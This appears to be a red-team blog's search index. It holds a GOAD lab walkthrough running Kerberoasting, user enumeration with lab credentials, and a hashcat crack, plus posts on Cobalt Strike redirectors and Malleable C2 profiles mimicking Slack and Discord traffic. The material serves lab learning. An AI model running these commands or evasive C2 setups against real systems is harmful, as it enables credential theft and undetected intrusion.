        "excerpt":"Previously:  Found two user names and passwords for the users, Samwell.tarly and Brandon.stark.   Note: A good thing to note in here is to not use any password spraying as there is a high  chance of blocking the users. Its always a good practice to look at the password policy of the domain.   crackmapexec smb winterfell --pass-pol or netexec smb winterfell --pass-pol   └─# netexec smb winterfell --pass-pol SMB         172.16.100.51   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) SMB         172.16.100.51   445    WINTERFELL       [+] Dumping password info for domain: NORTH SMB         172.16.100.51   445    WINTERFELL       Minimum password length: 5 SMB         172.16.100.51   445    WINTERFELL       Password history length: 24 SMB         172.16.100.51   445    WINTERFELL       Maximum password age: 311 days 2 minutes  SMB         172.16.100.51   445    WINTERFELL        SMB         172.16.100.51   445    WINTERFELL       Password Complexity Flags: 000000 SMB         172.16.100.51   445    WINTERFELL           Domain Refuse Password Change: 0 SMB         172.16.100.51   445    WINTERFELL           Domain Password Store Cleartext: 0 SMB         172.16.100.51   445    WINTERFELL           Domain Password Lockout Admins: 0 SMB         172.16.100.51   445    WINTERFELL           Domain Password No Clear Change: 0 SMB         172.16.100.51   445    WINTERFELL           Domain Password No Anon Change: 0 SMB         172.16.100.51   445    WINTERFELL           Domain Password Complex: 0 SMB         172.16.100.51   445    WINTERFELL        SMB         172.16.100.51   445    WINTERFELL       Minimum password age: 1 day 4 minutes  SMB         172.16.100.51   445    WINTERFELL       Reset Account Lockout Counter: 5 minutes  SMB         172.16.100.51   445    WINTERFELL       Locked Account Duration: 5 minutes  SMB         172.16.100.51   445    WINTERFELL       Account Lockout Threshold: 5 SMB         172.16.100.51   445    WINTERFELL       Forced Log off Time: Not Set   From above we can see that the password policy says if we fail 5 times in 5 minutes we lock the accounts for 5 minutes.   From here there are two ways to check for the other attacks. 1. Kerberoasting 2. Check for possible RDP to Winterfell using the gained creds 3. Drop in sharphound to check for other cool stuff   We shall start with finding more users in the domain/s   As we’ve found some users lets see, if we can find more users in the domain/s and see what can we get from those creds.                  From MayFly’s blogs:              When you get an account on an active directory, the first thing to do is always getting the full list of users.   Once you get it you could do a password spray on the full user list (very often you will find other accounts with weak password like username=password, SeasonYear!, SocietynameYear! or even 123456).   GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople   Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Querying north.sevenkingdoms.local for information about domain. Name                  Email                           PasswordLastSet      LastLogon            --------------------  ------------------------------  -------------------  ------------------- Administrator                                         2022-06-29 00:32:20.901897  2022-07-01 17:48:41.983605  Guest                                                 &lt;never&gt;              &lt;never&gt;              vagrant                                               2021-05-12 13:38:55.922520  2022-07-01 12:08:35.223885  krbtgt                                                2022-06-29 00:48:58.950440  &lt;never&gt;              arya.stark                                            2022-06-29 07:48:08.060667  2022-07-03 17:40:06.721358  eddard.stark                                          2022-06-29 07:48:11.560625  2022-07-04 23:33:27.976702  catelyn.stark                                         2022-06-29 07:48:15.013735  &lt;never&gt;              robb.stark                                            2022-06-29 07:48:18.544972  2022-07-04 23:35:50.678794  sansa.stark                                           2022-06-29 07:48:21.607059  &lt;never&gt;              brandon.stark                                         2022-06-29 07:48:24.278459  2022-07-04 23:36:08.991489  rickon.stark                                          2022-06-29 07:48:26.966809  &lt;never&gt;              hodor                                                 2022-06-29 07:48:29.670052  2022-07-04 23:21:58.774078  jon.snow                                              2022-06-29 07:48:32.373101  2022-07-03 17:36:26.798060  samwell.tarly                                         2022-06-29 07:48:35.107476  2022-07-01 16:35:17.043960  jeor.mormont                                          2022-06-29 07:48:37.841846  &lt;never&gt;              sql_svc                                               2022-06-29 07:48:40.248028  2022-07-03 15:56:57.924607           With ldap query, i recommend this article with all the useful ldap query for active directory : https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/            With ldap on north.sevenkingdoms.local       ldapsearch -H ldap://172.16.100.51 -D \"brandon.stark@north.sevenkingdoms.local\" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' \"(&amp;(objectCategory=person)(objectClass=user))\" |grep 'distinguishedName:'           With ldap query we can request users of the others domain because a trust is present.            On essos.local       ldapsearch -H ldap://172.16.100.52 -D \"brandon.stark@north.sevenkingdoms.local\" -w iseedeadpeople -b ',DC=essos,DC=local' \"(&amp;(objectCategory=person)(objectClass=user))\"   ldapsearch -H ldap://172.16.100.50 -D \"brandon.stark@north.sevenkingdoms.local\" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' \"(&amp;(objectCategory=person)(objectClass=user))\"   Kerberoasting           On an active directory, we will see very often users with an SPN set.            let’s find them with impacket       GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes   Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation   ---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  ----------- CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained  HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2022-06-29 07:48:32.373101  2022-06-29 10:34:54.308171  constrained  MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2022-06-29 07:48:40.248028  2022-06-29 22:54:57.422114               MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2022-06-29 07:48:40.248028  2022-06-29 22:54:57.422114   All the hashes will be stored in the file named kerberoasting.hashes      we could also do that with cme with the following command   cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING      Now let’s try to crack the hashes   hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force   Creds Found:   user : north/jon.snow:iknownothing   ","categories": ["GOAD"],
        "tags": ["GOAD","HomeLab","Active-Drirectory"],
        "url": "/goad/GOAD-p3/",
        "teaser": "/assets/images/sample/GOAD/goad-part3.png"
      },{
        "title": "RED-TEAM Home-Lab Infra",
        "excerpt":"After looking at a bunch of blogs from the other security folks about RED-Teaming. It started to bug my mind that how is all the setup done form the infrastructure side of things.   Taking the advantage from the experience of creating a home lab environment, using multiple hypervisors and networking. I decided to have my own infrastructure in my home lab. This home lab will contain a lot of things that will be related to starting from..      Networking   Multiple VMs   Multiple DMZs   Isolations   Netowork traffic   The victim network   Attacking infrstructure which will contain            Single/Multiple Redirectors       The attack box                    Windows Machine           Linux [Kali]                           Assumed Public Cloud infrastructure            This is where the redirectors stay           Using Pfsense firewall to accomplish all the above activity.   I’ve divided the Infra into 3 Parts, which is as follows.      Victim-Network   Assumed Public-Cloud   Attacking-Network   From the previous home-lab blog, I’ve showed the configuration of the HP-Proliant enterprise grade server. This server is a beast to run all the number of virtual machines that I wanted to execute for the infra.      Interested how the setup looks like? Check it    Below are some of the things that I strictly wanted to have in my LAB. This helps my in defining the things for further or future upgrades that I wanted to have in my LAB.      Attacker network should not directly talk or communicate with the victim network.   Victim network should not directly talk or communicate with the Attacker network.   The Victim or the attacker networks can only communicate to the public cloud.   Here the bridge/communication between these two networks is only via Public Cloud-Network.   Due to security constraints/reasons, the victim network only allow the egress traffic to the public cloud via port 443 HTTPS.   Along the other side to keep the attacking infra safe, the attacking network will only communicate to the Public cloud via 22 SSH by tunneling the traffic using redirectors.   I’ve created a small Network Diagram to show how the idea is going to work.   RTIL.drawio.html                  Here the networking can be as simple as above or it can go as complex as possible depending on your imagination how you wanted to create the whole environment.      Attacker Network -&gt; 172.16.10.0/24   Public Cloud Services -&gt; 172.16.50.0/24   Complete Victim Network -&gt; 172.16.100.0/24, 172.16.110.0/24, 172.16.120.0/24   The reason behind using multiple Victim networks is to have multiple environments in the LAB where there is some consistency can be seen, when ever you wanted to deploy new labs and stuff like that. In my case I’ve couple of Labs set in the victim network.      GOAD [The Game Of Active Directory]   SCCM / MECM LAB   Both the labs are build by # Orange Cyberdefense. So, from the above structure, I’ve my Victim network as follows.      GOAD -&gt; 172.16.100.0/24   SCCM -&gt; 172.16.110.0/24      So now the question is how to setup this using pfsense?    The above networking is achieved by setting up multiple V-LANS in PFSense firewall and adding firewall rules. Also, will be covering the networking part of the story using PFSense. The story kept for some other day.   Stay tuned for the upcoming blog!!  ","categories": ["Red-Team"],
        "tags": ["HomeLab","IT","RED-Team"],
        "url": "/red-team/RED-TEAM-Infra/",
        "teaser": "/assets/images/sample/homelab/RTIL.jpg"
      },{
        "title": "Cobalt Strike Redirectors using Apache-SSL",
        "excerpt":"Overview   Redirectors are systems designed to proxy traffic from a target network to private attack infrastructure. They play a vital role in ensuring operational security and serve several key purposes:   1. Preventing Unauthorized Access  Redirectors act as a shield, preventing unauthorized parties from accessing the underlying attack infrastructure. They can:  Only allow authorized users or systems to connect to the actual infrastructure.  Make the infrastructure appear harmless or unrelated to its real purpose, deterring unwanted attention.   2. Shaping How the Infrastructure Appears  Redirectors control how the target perceives the infrastructure by:  Modifying content, headers, or other elements to make traffic appear legitimate and unsuspicious.  Mimicking well-known platforms or architectures to blend in and avoid detection.   3. Safeguarding the Attack Chain  By acting as a buffer, redirectors help ensure that the overall attack chain remains intact, even if a part of it is exposed. They achieve this by:  Keeping different parts of the infrastructure separate to minimize the risk of exposure.  Hiding communication patterns to make it harder to trace or identify the destination.  Providing a way to swiftly redirect traffic to backup systems if a redirector is compromised.   In red team operations, penetration testing, or other offensive security scenarios, redirectors are essential. They offer a blend of protection, control, and flexibility, making them a cornerstone of effective attack frameworks.   4. Cobalt Strike Redirectors using Apache-SSL   Step – 01   On the cobalt strike team server, we’ve to generate two files. public.crt and private.key.   root@teamserver: openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key   Once the command is executed,  you will be presented with the below prompts.   Country Name (2 letter code) [AU]:  State or Province Name (full name) [Some-State]: Locality Name (eg, city) []: Organization Name (eg, company) [Internet Widgits Pty Ltd]:  Organizational Unit Name (eg, section) []: Common Name (e.g. server FQDN or YOUR name) []: 172.16.100.3 Email Address []:   Here the common name can be the domain you own. for my case I’m just using the ip of my teamserver.      now copy both the files from your teamsever to the redirector machines /etc/apache2/ssl  by creating an ssl folder.   Step – 02   root@redirector1: sudo apt install apache2  root@redirector1: sudo a2enmod ssl rewrite proxy proxy_http  root@redirector1:~# mkdir -p /etc/apache2/ssl     root@redirector1: sudo nano /etc/apache2/sites-available/default-ssl.conf      Example of default-ssl.conf   &lt;IfModule mod_ssl.c&gt;     &lt;VirtualHost *:443&gt;         ServerAdmin webmaster@localhost         DocumentRoot /var/www/html                  SSLEngine on         SSLProxyEngine on         SSLProxyCheckPeerCN off         SSLCertificateFile /etc/apache2/ssl/Your-Team-server.crt         SSLCertificateKeyFile /etc/apache2/ssl/Your-Team-server.key                  &lt;Directory /var/www/html&gt;             Options Indexes FollowSymLinks MultiViews             AllowOverride All             Require all granted         &lt;/Directory&gt;                  ErrorLog ${APACHE_LOG_DIR}/error.log         CustomLog ${APACHE_LOG_DIR}/access.log combined     &lt;/VirtualHost&gt; &lt;/IfModule&gt;   Make sure to have these in the default-ssl.conf SSLEngine on SSLProxyEngine on SSLProxyCheckPeerCN off   root@redirector1: sudo systemctl restart apache2   Now open a browser and open https://redirector1. you should see apache now running with SSL.      Quick thing to check in here if you’ve the right certificate is that by checking the cert. your should see your team-server ip or the FQDN in the certificate.      Step – 03   Now for the team-sever to communicate with our apache ssl. As cobalt-strike is written in java, the public certificate and private key need to be imported into a Java KeyStore.   First, we need to combine the separate public and private files into a single PKCS12 file.  Set the password to anything you want, but remember it.   root@teamserevr: openssl pkcs12 -inkey private.key -in public.crt -export -out tserver.pkcs12   You will be prompter to enter password:   Enter Export Password: Verifying - Enter Export Password:   Do enter the password you can remember. Once done, you’ll see a file called tserver.pkcs12   That PKCS12 file can then be converted to a Java KeyStore using the keytool utility.   root@teamserevr: keytool -importkeystore -srckeystore tserver.pkcs12 -srcstoretype pkcs12 -destkeystore tserver.store   You’ll be prompted asking to enter the password. You can use the same password as before. make sure you remember it as we’ll be using it in the Malleable-C2-Profiles.   The password of this new store can be the same or different.  At this point, the .pkcs12 file can be deleted.  The new Java KeyStore needs to be referenced in a Malleable C2 profile before it can be used.   https-certificate {      set keystore “tserver.store”;      set password “password”; }   The Cobalt Strike Team Server expects the KeyStore to be in the same directory as itself.  Launch the Team Server with the updated profile.   root@teamserver: ./teamserver IP-address passwword@123 apt.profile  ","categories": ["Red-Team"],
        "tags": ["HomeLab","IT","RED-Team"],
        "url": "/red-team/redirectors/",
        "teaser": "/assets/images/sample/homelab/cs.webp"
      },{
        "title": "Cobalt Strike Malleable C2 Profiles",
        "excerpt":"Overview   Beacon’s HTTP indicators are controlled by a Malleable Command and Control (Malleable C2) profile. A Malleable C2 profile is a simple program that specifies how to transform data and store it in a transaction. The same profile that transforms and stores data, interpreted backwards, also extracts and recovers data from a transaction.   To use a custom profile, you must start a Cobalt Strike team server and specify your profile at that time.   ./teamserver [external IP] [password] [/path/to/my.profile]   You may only load one profile per Cobalt Strike instance.   Malleable C2 is a domain specific language to redefine indicators in Beacon’s communication. This repository is a collection of Malleable C2 profiles that you may use. These profiles work with Cobalt Strike 3.x.   Slack and Discord Simulation Profiles   Purpose  These profiles are designed to simulate HTTP communication patterns resembling Slack and Discord traffic. They aim to improve operational security (OPSEC) by mimicking legitimate application behavior to evade detection in network monitoring environments.        The profiles utilize dynamic URIs for both HTTP GET and POST requests.        A metadata block is used to prepend and append channel-specific identifiers (e.g., channel-&lt;dynamic&gt;-dynamic) to create the appearance of real-time channel activity.       HTTP GET traffic uses a Slack-specific user-agent: Slack/4.23.0 (Mac OS X 10.15.7).        HTTP POST traffic uses a Discord-specific user-agent: Discord/1.0 (Linux; Android 10; Scale/3.0).       spawnto_x86 and spawnto_x64 are set to taskhostw.exe, a legitimate Windows process, instead of the highly scrutinized svchost.exe.        The host_stage parameter is disabled (false) to avoid exposing payloads to unauthorized parties.       The certificates mimic Slack and Discord services:            For Slack: CN=\"slack.com\", O=\"Slack Technologies, LLC\".       Valid for 365 days to appear realistic.           Authorization headers include tokens (Bearer &lt;bot-token&gt; and Bearer &lt;user-token&gt;) to simulate API usage.        Headers like Content-Type, Accept, and User-Agent are customized to match Slack and Discord API patterns.       GET and POST responses are encoded in Base64 and prefixed with keywords (e.g., response_, msg_send_) to mimic legitimate payloads.   The traffic mimics typical JSON API responses.   You can find the C2-Profiles in my github repo: C2-Profiles    Traffic Example  HTTP-GET Request:  GET /api/v9/channels/channel-123456-dynamic HTTP/1.1 Host: slack.com Authorization: Bearer &lt;bot-token&gt; User-Agent: Slack/4.23.0 (Mac OS X 10.15.7) Accept: application/json   HTTP-POST Request:  POST /api/v9/channels/channel-123456-dynamic HTTP/1.1 Host: discord.com Authorization: Bearer &lt;user-token&gt; User-Agent: Discord/1.0 (Linux; Android 10; Scale/3.0) Content-Type: application/json    Real Time Example:   Once the profile is loaded with cobalt-strike. Create a listner with port 80. The reason to use port 80 is just for demonstration purposes.   listner config      Beacon call back from victim      Open wireshark on the victim machine and check for traffic.      Select the destination address and port number.      right click and check for follow TCP-stream     ","categories": ["Red-Team"],
        "tags": ["HomeLab","IT","RED-Team"],
        "url": "/red-team/Malleable-c2-pro/",
        "teaser": "/assets/images/sample/homelab/malleablec2.jpg"
      },{
    "title": "GOAD-Archive",
    "excerpt":" ","url": "http://localhost:4000/GOAD-Archive/"
  },{
    "title": "Red-Team",
    "excerpt":" ","url": "http://localhost:4000/red-team/"
  },{
    "title": "About",
    "excerpt":"About Me   Welcome to my corner of the internet! I’m a passionate hacker, Red Team specialist, and penetration tester dedicated to uncovering vulnerabilities and fortifying defenses in the ever-evolving field of cybersecurity.   My Journey   My journey into hacking began with a simple curiosity about how systems work. Over the years, I’ve honed my skills through various avenues:           Red Teaming: I specialize in simulating real-world attacks to test and improve organizational security. My goal is to think like an adversary, uncovering potential weaknesses before they can be exploited.            Penetration Testing: I perform comprehensive security assessments, identifying vulnerabilities in applications and networks. I’m committed to providing actionable insights to enhance security postures.            CTF Competitions: I thrive on challenges and regularly participate in Capture The Flag (CTF) competitions. These events push my skills to the limit and allow me to collaborate with other cybersecurity enthusiasts.            Hack The Box: I actively engage with platforms like Hack The Box, where I tackle real-world hacking scenarios that sharpen my skills and keep me on my toes.       Home Labs   In my spare time, I invest in building and experimenting with home labs. These environments allow me to simulate attacks and defenses, giving me hands-on experience that is crucial for staying ahead in the field. I enjoy sharing insights and strategies with the community, fostering a collaborative learning atmosphere.   Join Me   I believe that the key to a safer digital world lies in continuous learning and collaboration. Join me as I explore the intricacies of cybersecurity, share knowledge, and work towards making the digital landscape a safer place for everyone.    ","url": "http://localhost:4000/about/"
  },{
    "title": "Posts by Category",
    "excerpt":" ","url": "http://localhost:4000/categories/"
  },{
    "title": "You really think I've helped you",
    "excerpt":"                            Initialize Connection           $ sudo required-fields                   Email_Address *                                                                                                                                       Like the work ??   Thank you for visiting my blog and taking the time to explore my work! 💖   If you’ve enjoyed my posts or found them helpful, here’s how you can show your support by subscribing to the blogs.   Why Support Matters   Running this blog takes time and effort, and every bit of support helps me continue doing what I love—sharing insights, stories, and tips with you!   Thank you for being part of this journey. 💫  ","url": "http://localhost:4000/helpedyou/"
  },{
    "title": "IT Posts",
    "excerpt":" ","url": "http://localhost:4000/it-posts/"
  },{
    "title": "Posts by Tag",
    "excerpt":"","url": "http://localhost:4000/tags/"
  },{
    "title": "Tools",
    "excerpt":"","url": "http://localhost:4000/tools/"
  }]
